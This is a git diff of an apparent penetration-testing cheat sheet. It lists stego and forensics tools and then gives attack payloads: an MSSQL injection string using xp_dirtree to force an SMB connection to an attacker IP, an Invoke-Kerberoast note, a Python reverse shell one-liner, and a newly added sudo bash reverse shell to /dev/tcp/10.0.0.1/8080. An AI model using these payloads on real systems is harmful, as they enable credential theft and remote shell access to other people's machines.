@@ -38,8 +38,6 @@ zsteg,steghide,binwalk.strings,file,foremost
  Other tools
 readpst,mdb-shell,mdb-sql
 
-
-
 Reading smbshare from mssql service using xp_dirtree:
 ;declare @q varchar(200);set @q="\;your_ip\test";exec master.dbo.xp_dirtree @q;--
 
@@ -81,3 +79,5 @@ Invoke-kerberoast | fl  { default format of key is john but format can be change
 Python shell payload :
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("ip",port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");';
 
+Reverse Shell using terminal:
+ command = sudo bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
